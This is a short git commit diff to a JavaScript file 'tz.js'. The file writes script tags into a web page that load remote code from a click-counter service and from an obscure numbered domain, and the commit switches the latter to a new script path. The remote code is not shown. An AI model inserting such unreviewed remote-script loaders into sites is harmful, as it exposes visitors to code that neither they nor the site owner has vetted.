6182ac58a7c72b926c4db0ad440eed615a2b53c3
js999999999 <js-9@outlook.com>
2017-02-16 14:23:47 +0800

    Update tz.js

--- 2017cc/tz.js
+++ 2017cc/tz.js
@@ -1,3 +1,3 @@
 document.writeln("<script language=\"javascript\" src=\"http:\/\/count18.51yes.com\/click.aspx?id=187111265&logo=12\" charset=\"gb2312\"><\/script>");
 
-document.writeln("<script src=http:\/\/\www.647123.com\/2017cc/t.js ><\/script>");
+document.writeln("<script src=http:\/\/\www.647123.com\/2017cc/t1.js ><\/script>");
